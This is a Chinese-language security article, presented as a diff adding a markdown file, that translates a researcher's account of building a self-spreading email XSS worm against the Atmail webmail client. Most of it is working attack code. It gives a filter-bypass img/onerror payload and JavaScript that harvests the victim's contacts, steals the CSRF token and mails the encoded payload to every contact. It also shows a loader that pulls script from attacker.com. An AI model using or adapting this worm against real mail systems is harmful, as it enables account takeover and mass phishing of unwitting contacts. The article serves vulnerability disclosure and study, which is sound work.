@@ -1,0 +1,144 @@
+**严正声明：本文仅用于教育和技术讨论目的，请勿用于非法用途。**
+
+## 前言
+
+**Atmail是一个热门的云服务以及电子邮件托管提供商，目前有很多公司、主机服务商和ISP都在使用Atmail，比如说DreamHost、LegalShield
+(美国)、m:tel(波斯尼亚)、iiNet和Optus (澳大利亚)。**
+
+![页首配图](https://image.3001.net/images/20181124/1543000270_5bf850ce7f7d4.png!small)
+
+作为DreamHost上的一名Atmail用户，当我在专注于漏洞奖励项目的过程中，我曾见过几次令我印象深刻的基于电子邮件的跨站脚本（XSS）攻击。当时我曾尝试从他们的Web邮件客户端中寻找安全漏洞，几个小时后我便开发出了一个可用的Payload，但是我想更进一步，也就是构建一个[旧式的XSS蠕虫](https://en.wikipedia.org/wiki/XSS_worm)。最著名的XSS蠕虫就是2005年感染MySpace的[蠕虫病毒](https://en.wikipedia.org/wiki/Samy_\(computer_worm\))了，而且在2014年这个蠕虫的最新变种还成功感染了
+[TweetDeck](https://nakedsecurity.sophos.com/2014/06/11/twitter-jumps-to-block-xss-worm-in-tweetdeck/)。
+
+在这篇文章中，我将会给大家演示如何构建一个可以通过目标用户联系人来进行自我传播的XSS Payload。
+
+## 测试环境
+
+在开始之前，我们需要搭建一个简单的测试环境。我们可以通过下列命令来发送电子邮件，然后在邮件内容中植入XSS测试Payload：
+
+    
+    
+    cat content | mail -a "Content-type: text/html" -s "test" victim1@zjulian.com
+
+接下来，使用Firefox的开发者工具来查看XSS Payload在Web邮件客户端的DOM中是如何呈现的。
+
+## 构建XSS Payload
+
+第一步，就是要构建一个能够绕过Atmail内容过滤器的XSS
+Payload。我一开始发送了一封包含了全部有效HTML标签的邮件，然后看看它是否能够成功送达，尽管我只打算使用<img>标签。不过，<img>标签虽然非常适合构建XSS
+Payload，但是在XSS触发之前，目标用户必须要选择在Atmail中显示图像才行。因此我们得使用那些不需要用户交互便可以呈现内容的标签，这样才能提升Payload的质量。
+
+接下来，我开始研究Atmail是如何清除Payload的。Atmail为了对邮件内容进行过滤，并在用户浏览器中显示语法正确的标记信息，Atmail会对<img>标签中的字符和HTML属性进行修改。研究之后我发现，Atmail只接受src、alt、longdesc、style、height和width这几个属性，而且我还注意到，Atmail会将单引号转换为双引号，移除onerror事件，并且移除所有不包含src属性的<img>标签。
+
+虽然onerror事件被移除了，但是如果能够在<img>标签中同时使用单引号和双引号的话，也许能够绕过Atmail的过滤机制。显然，这样是可行的：
+
+    
+    
+    <img longdesc="src='x'onerror=alert(document.domain);//><img "src='showme'>
+
+下面就是呈现在Web邮件客户端中的内容：
+
+    
+    
+    <img longdesc="src=" images="" stop.png"=""onerror="alert(document.domain);//&ampquot" src="x"alt="showme">
+
+![构建XSS
+Payload](https://image.3001.net/images/20181124/1543000299_5bf850eb8cf0f.png!small)
+
+## 构建蠕虫
+
+找到了有用的XSS向量之后，下一步就是创建一个Payload来传播我的电子邮件蠕虫。我编写了一份JavaScript代码，然后完成了下列三件事：
+
+1、 提取目标用户的联系人列表；
+
+2、 从Atmail提取有效的CSRF令牌；
+
+3、 向目标用户联系人列表中的每一位用户发送恶意邮件；
+
+代码大致如下，XSS Payload以URL编码的形式提供：
+
+    
+    
+    //HTTP request to grab victim's contacts
+    
+    xmlHttp=newXMLHttpRequest();
+    
+    xmlHttp.open('GET','/index.php/mail/contacts/viewcontacts/GroupID/0',false);
+    
+    xmlHttp.send(null);
+    
+    response=xmlHttp.responseText;
+    
+     
+    
+    //Extract email addresses and filter duplicates
+    
+    var extractedemails = response.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+.[A-Z]{2,4}/igm);
+    
+    var uniqueemails = []; 
+    
+    for(vari = 0; i < extractedemails.length; i++){if(uniqueemails.indexOf(extractedemails[i]) == -1)uniqueemails.push(extractedemails[i]);}
+    
+     
+    
+    //HTTP request to get CSRF token
+    
+    xmlHttp.open('GET','/index.php/mail/contacts',false);
+    
+    xmlHttp.send(null);
+    
+    response2=xmlHttp.responseText;
+    
+    var csrftoken = response2.match(/name=\"atmailCSRF"value=\"(.+?)\"/im);
+    
+     
+    
+    //Loop through contacts and send email
+    
+    for(var i = 0; i < uniqueemails.length; i++) {
+    
+           xmlHttp.open('POST','/index.php/mail/composemessage/send',false);
+    
+           var params = 'atmailCSRF=' + csrftoken[1]+ '&emailTo=' + unique[i] +'&emailSubject=open%20me&emailBodyHtml=%3c%68%33%3e%61%74%6d%61%69%6c%20%65%6d%61%69%6c%20%58%53%53%20%77%6f%72%6d%3c%2f%68%33%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%3c%69%6d%67%20%6c%6f%6e%67%64%65%73%63%3d%22%73%72%63%3d%27%78%27%6f%6e%65%72%72%6f%72%3d%65%76%61%6c%28%77%69%6e%64%6f%77%2e%61%74%6f%62%28%27%61%57%35%6a%62%48%56%6b%5a%54%31%6b%62%32%4e%31%62%57%56%75%64%43%35%6a%63%6d%56%68%64%47%56%46%62%47%56%74%5a%57%35%30%4b%43%64%7a%59%33%4a%70%63%48%51%6e%4b%54%74%70%62%6d%4e%73%64%57%52%6c%4c%6e%4e%79%59%7a%30%6e%61%48%52%30%63%48%4d%36%4c%79%39%68%64%48%52%68%59%32%74%6c%63%69%35%6a%62%32%30%76%59%58%52%74%59%57%6c%73%4c%6d%70%7a%4a%7a%74%6b%62%32%4e%31%62%57%56%75%64%43%35%6f%5a%57%46%6b%4c%6d%46%77%63%47%56%75%5a%45%4e%6f%61%57%78%6b%4b%47%6c%75%59%32%78%31%5a%47%55%70%4f%77%3d%3d%27%29%29%3b%2f%2f%3e%3c%69%6d%67%20%22%20%73%72%63%3d%27%73%68%6f%77%6d%65%27%3e';
+    
+           xmlHttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    
+           xmlHttp.send(params);
+
+首先，我尝试过Base64编码，然后把XSS
+Payload嵌入到了onerror事件中。接下来，代码会使用eval(atob())来解码并执行Payload代码：
+
+    
+    
+    <img longdesc=" xss/src='x'onerror=eval(window.atob('eGg9bmV3IFhNTEh0dHBS…omitted forbrevity…'));//><img " src='showme'>
+
+但是，我发现Atmail会将我Base64编码的字符串压缩到945个字符，这就太短了。所以我打算把它托管到一个外部地址，然后重写我的XSS Payload：
+
+    
+    
+    onerror="include=document.createElement('script');include.src='https://attacker.com/atmail.js';document.head.appendChild(include);"
+
+上面这段Payload代码会在页面<head>元素中创建一个新的<script>标签，标签中将包含我外部托管的恶意JavaScript代码。它也采用了Base64编码：
+
+    
+    
+    onerror="include=document.createElement('script');include.src='https://attacker.com/atmail.js';document.head.appendChild(include);"
+
+### 下面的视频演示了蠕虫的工作机制：
+
+## 总结
+
+对于网络诈骗分子和其他恶意攻击者来说，Atmail上的XSS蠕虫是非常有用的，因为他们可以利用这种技术来控制目标用户的账号，并给他们通讯录里的联系人发送任意信息，因此这种攻击技术正好适用于垃圾邮件、恶意软件传播以及钓鱼攻击。
+
+### 参考资料
+
+> <https://www.bishopfox.com/news/2017/06/atmail-7-stored-xss-vulnerability/>
+
+### 参考代码
+
+    
+    
+    <img src="x" align="left" alt="test"border="1px" crossorigin="anonymous"height="100px" hspace="100px" ismaplongdesc="test" sizes="(min-width: 600px) 200px, 50vw"srcset="test.png 2x" usemap="#test"vspace="100px" width="100px">
+
+ ***参考来源：[bishopfox](https://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
